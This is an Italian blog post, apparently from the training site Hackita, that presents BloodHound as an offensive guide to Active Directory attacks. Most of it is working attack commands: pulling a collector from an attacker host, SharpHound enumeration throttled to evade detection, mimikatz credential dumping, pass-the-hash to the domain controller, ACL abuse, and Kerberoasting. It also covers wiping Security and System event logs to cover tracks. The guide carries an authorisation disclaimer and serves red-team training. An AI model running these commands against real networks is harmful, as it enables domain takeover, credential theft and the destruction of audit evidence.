---
title: 'BloodHound: mappa l’Active Directory come un hacker'
description: >-
  Scopri come usare BloodHound per analizzare Active Directory e trovare
  escalation di privilegi. Tool essenziale per Red Team e attacchi interni
  simulati.
image: /BH.webp
draft: true
date: 2026-01-23T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - bloodhound
  - active directory
featured: false
---

# BloodHound: La Mappa per Dominare l'Active Directory - Guida Offensiva

**Report Red Team | Ambiente Controllato Autorizzato**

Quando ti trovi davanti a un dominio Active Directory, sei come un esploratore in una città sconosciuta. Puoi vagare per ore, o puoi avere una mappa che ti mostra ogni vicolo, ogni passaggio segreto, ogni relazione di potere. BloodHound è quella mappa. È lo strumento che trasforma un attacco AD da una ricerca casuale in una caccia chirurgica.

## Cos'è BloodHound e Perché è Così Potente

BloodHound non è un semplice scanner. È un **motore di analisi relazionale** per Active Directory che visualizza le connessioni nascoste tra utenti, gruppi, computer e permessi. Mentre gli strumenti tradizionali ti danno liste, BloodHound ti mostra **percorsi di attacco** completi.

### Il Concetto Fondamentale: Il Grafo AD

Active Directory è intrinsecamente un grafo:

* **Nodi**: Utenti, gruppi, computer, domini
* **Relazioni**: MemberOf, AdminTo, HasSession, Owns, WriteDACL

BloodHound prende queste relazioni e risponde a una domanda semplice ma potente: "Se controllo questo utente, come posso arrivare a diventare Domain Admin?"

### Componenti Chiave di BloodHound

1. **BloodHound UI**: L'interfaccia web per visualizzare e interrogare il grafo
2. **SharpHound**: Il collector che raccoglie dati dall'AD
3. **Neo4j**: Il database grafo che memorizza tutte le relazioni
4. **Cypher Query Language**: Il linguaggio per interrogare il database

## Cosa Fa BloodHound: Da Dati Grezzi a Percorsi di Attacco

### Il Processo in 3 Fasi

```
Fase 1: Raccolta → SharpHound enumera l'AD e raccoglie tutte le relazioni
Fase 2: Importazione → I dati vengono caricati in Neo4j
Fase 3: Analisi → Trovi percorsi di escalation che non avresti mai visto manualmente
```

### I Dati che Raccoglie (e Perché Sono Letali)

SharpHound raccoglie specificamente:

* **Appartenenze a gruppi** (chi è membro di cosa)
* **Privilegi locali admin** (quali utenti sono admin su quali computer)
* **Sessioni attive** (chi è loggato dove)
* **Permessi ACL** (chi può modificare cosa)
* **Trust tra domini** (come i domini si fidano tra loro)

## A Cosa Serve BloodHound per un Attaccante

### Scenario Reale di un Red Team

Immagina di aver compromesso l'account di un normale impiegato. Il vecchio approccio sarebbe:

```bash
net user jdoe /domain
net group "Domain Admins" /domain
# ...e sperare di trovare qualcosa
```

Con BloodHound, vedi immediatamente:

```
jdoe → MemberOf → HelpDesk → AdminTo → Server01 → HasSession → admin.user → MemberOf → Domain Admins
```

**Traduzione**: L'impiegato jdoe è nel gruppo HelpDesk, che ha privilegi admin su Server01, dove admin.user (che è Domain Admin) ha una sessione attiva.

## Come Si Implementa: Setup Pratico

### Installazione Rapida (Docker - Metodo Consigliato)

```bash
# 1. Pull dell'immagine Docker
sudo docker pull bloodhound/bloodhound:latest

# 2. Avvio del container
sudo docker run -p 8080:8080 -p 7687:7687 \
  -v bloodhound-data:/data \
  -e NEO4J_AUTH=neo4j/YourPassword123! \
  --name bloodhound \
  bloodhound/bloodhound:latest

# 3. Verifica
sudo docker ps
# OUTPUT ATTESO:
# CONTAINER ID   IMAGE                        PORTS                                           NAMES
# abc123def456   bloodhound/bloodhound:latest   0.0.0.0:7687->7687/tcp, 0.0.0.0:8080->8080/tcp   bloodhound
```

### Accesso all'Interfaccia

```bash
# Interfaccia web disponibile su: http://tuo-ip:8080
# Credenziali: neo4j / YourPassword123!
```

## La Raccolta Dati con SharpHound

### Download e Preparazione

```bash
# Scarica SharpHound dalla tua macchina di attacco
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe

# Trasferiscilo sulla macchina compromessa
# Metodo 1: SMB
smbclient -U 'CORP\\jdoe%Password123' //192.168.1.10/C$ -c 'put SharpHound.exe'

# Metodo 2: PowerShell (dalla shell già ottenuta)
powershell -c "Invoke-WebRequest -Uri http://192.168.100.50/SharpHound.exe -OutFile C:\Windows\Temp\SharpHound.exe"
```

### Tecniche di Raccolta Efficaci

```powershell
# Situazione: sei sulla workstation compromessa come jdoe

# 1. Raccolta iniziale (stealth)
.\SharpHound.exe -c DCOnly --domain corp.local --zipfilename initial

# OUTPUT ESEMPIO:
# [+] Initializing SharpHound at 09:00:00
# [+] Loaded collection method: DCOnly
# [+] Beginning enumeration
# [+] Finished enumeration in 00:03:45
# [+] Compressing data to 20240515090000_initial.zip

# 2. Raccolta completa (quando puoi)
.\SharpHound.exe -c All --domain corp.local

# 3. Raccolta mirata su sessioni
.\SharpHound.exe -c Session --domain corp.local
```

### Opzioni Avanzate di Raccolta

```powershell
# Raccolta con throttle per evitare detection
.\SharpHound.exe -c All --throttle 1000 --jitter 30 --domain corp.local

# Raccolta solo su specifiche OU
.\SharpHound.exe -c All --SearchBase "OU=Servers,DC=corp,DC=local"

# Raccolta con ZIP criptato
.\SharpHound.exe -c All --encryptZip --pass MySecretKey123
```

## Importazione e Analisi dei Dati

### Upload in BloodHound

1. Accedi a `http://tuo-ip:8080`
2. Clicca su "Upload Data"
3. Seleziona il file ZIP generato da SharpHound
4. Attendi il completamento (1-5 minuti)

### Query Essenziali per l'Attacco

Nel pannello "Query" di BloodHound, usa queste query Cypher:

```cypher
// 1. Trova il percorso più breve verso Domain Admins
MATCH (u:User {name: "JDOE@CORP.LOCAL"}), (g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
MATCH p = shortestPath((u)-[*1..]->(g))
RETURN p

// 2. Trova utenti con sessioni su server
MATCH (c:Computer), (u:User)-[:HasSession]->(c)
WHERE c.operatingsystem CONTAINS "Server"
RETURN u.name, c.name

// 3. Trova computer dove gli utenti sono admin locali
MATCH (u:User)-[:AdminTo]->(c:Computer)
RETURN u.name, COUNT(c) as ComputerCount
ORDER BY ComputerCount DESC

// 4. Trova utenti Kerberoastable
MATCH (u:User {hasspn: true})
RETURN u.name, u.serviceprincipalnames
```

## Sfruttamento Pratico: Da Analisi ad Azione

### Scenario 1: Sfruttare Gruppi Nidificati

**Situazione**: BloodHound mostra `jdoe → MemberOf → HelpDesk → MemberOf → ServerAdmins`

```powershell
# Verifica manuale
net user jdoe /domain
# Risposta: Member of HelpDesk

net group "HelpDesk" /domain
# Risposta: Member of ServerAdmins

net group "ServerAdmins" /domain
# Risposta: Has admin rights on multiple servers

# Azione: Usa jdoe per accedere a uno dei server
psexec.py corp.local/jdoe:Password123@SRV-APP01 cmd.exe
```

### Scenario 2: Sfruttare Sessioni Attive

**Situazione**: BloodHound mostra `WS-023 → HasSession → admin.server → MemberOf → Domain Admins`

```bash
# Passo 1: Comprometti WS-023 (già fatto)
# Passo 2: Cerca sessioni attive con comandi nativi
net session \\WS-023

# Passo 3: Se hai accesso locale, usa Mimikatz
mimikatz # sekurlsa::logonpasswords

# OUTPUT:
# Authentication Id : 0 ; 123456
# User Name         : admin.server
# Domain            : CORP
# NTLM              : 329153f560eb329c0e1deea55e88a1e9

# Passo 4: Pass-the-Hash verso il DC
psexec.py corp.local/admin.server@DC01 -hashes aad3b435b51404eeaad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9
```

### Scenario 3: ACL Abuse

**Situazione**: BloodHound mostra `jdoe → GenericAll → Computer01`

```powershell
# Con PowerView, sfrutta il permesso
Add-DomainObjectAcl -TargetIdentity "CN=Computer01,CN=Computers,DC=corp,DC=local" `
  -PrincipalIdentity jdoe -Rights All

# Ora jdoe può aggiungersi al gruppo Administrators locale
Add-DomainGroupMember -Identity "Administrators" -Members "jdoe" -ComputerName "Computer01"
```

## Workflow di Attacco Completo

### Fase 1: Accesso Iniziale

```bash
# Ottenute credenziali via phishing o altro metodo
psexec.py corp.local/jdoe:Password123@WS-102 cmd.exe
```

### Fase 2: Raccolta Dati

```powershell
# Dalla shell su WS-102
.\SharpHound.exe -c DCOnly --domain corp.local
```

### Fase 3: Analisi

1. Upload del file ZIP in BloodHound
2. Cerca percorsi da JDOE a Domain Admins
3. Identifica il percorso più promettente

### Fase 4: Movimento Laterale

```bash
# Esempio: percorso trovato: jdoe → AdminTo → SRV-APP01
psexec.py corp.local/jdoe:Password123@SRV-APP01 cmd.exe

# Da SRV-APP01, nuova raccolta dati
.\SharpHound.exe -c Session,LocalAdmin --domain corp.local
```

### Fase 5: Escalation Finale

```bash
# Nuovo percorso trovato: SRV-APP01 → HasSession → admin.user
# Dump credenziali su SRV-APP01
mimikatz # sekurlsa::logonpasswords

# Utilizzo hash per diventare Domain Admin
psexec.py corp.local/admin.user@DC01 -hashes <hash_ntlm>
```

## Best Practices per l'Uso Offensivo

### Minimizzare l'Impronta Digitale

```powershell
# Usa throttle e jitter
.\SharpHound.exe -c Group,ACL --throttle 2000 --jitter 50

# Raccogli in fasi separate
.\SharpHound.exe -c Group
Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 300)
.\SharpHound.exe -c Session
```

### Pulizia Post-Operazione

```powershell
# Cancella file di SharpHound
Remove-Item C:\Windows\Temp\SharpHound.exe -Force
Remove-Item C:\Windows\Temp\*.zip -Force

# Cancella log
wevtutil cl System
wevtutil cl Security
```

## Casi d'Uso Avanzati

### Kerberoasting con BloodHound

```cypher
// Trova utenti con SPN (vulnerabili a Kerberoasting)
MATCH (u:User {hasspn: true})
RETURN u.name, u.serviceprincipalnames

// Poi usa tools come GetUserSPNs o Rubeus
GetUserSPNs.py corp.local/jdoe:Password123 -request
```

### Unconstrained Delegation

```cypher
// Trova computer con Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation: true})
RETURN c.name

// Se hai accesso a uno di questi computer, puoi rubare ticket TGT
```

## Conclusione: Perché BloodHound è Ineguagliabile

BloodHound rivoluziona l'attacco AD perché:

1. **Visualizza relazioni invisibili** che gli strumenti tradizionali non mostrano
2. **Trova percorsi non ovvi** che un attaccante umano potrebbe non vedere
3. **Riduce il time-to-compromise** da giorni/ore a minuti
4. **Permette attacchi chirurgici** invece di brute-force rumorosi

È lo strumento che trasforma una compromissione limitata in controllo completo del dominio, mostrando esattamente dove applicare pressione per far crollare l'intera struttura.

***

### Pronto a Padroneggiare BloodHound e gli Attacchi AD?

Questa guida mostra solo le basi. Per imparare veramente a condurre attacchi AD completi in ambienti realistici, serve formazione pratica e mentorship esperta.

**Hackita** offre proprio questo:

* **Corsi pratici su Active Directory** con laboratori che replicano ambienti aziendali reali
* **Mentorship 1:1** con professionisti del Red Teaming
* **Formazione aziendale** su misura per il tuo team
* **Accesso a scenari complessi** 24/7

Imparerai non solo a usare BloodHound, ma a:

* Condurre enumerazione AD avanzata
* Eseguire movimento laterale efficace
* Mantenere persistenza in ambienti monitorati
* Evadere sistemi di detection moderni
* Redigere report professionali per clienti

[Scopri i nostri servizi formativi](https://hackita.it/servizi/) e inizia il tuo percorso nell'offensive security.

**Supporta la Comunità:**
Aiutaci a mantenere i laboratori e creare nuovi contenuti formativi. [Una donazione](https://hackita.it/supporto/) ci permette di offrire formazione accessibile e di alta qualità.

**Ricorda:** Queste tecniche devono essere utilizzate solo in ambienti controllati e con autorizzazione esplicita, per scopi didattici e di miglioramento delle difese.

**Formati. Sperimenta. Previeni.**

[Hackita - Excellence in Offensive Security](https://hackita.it)
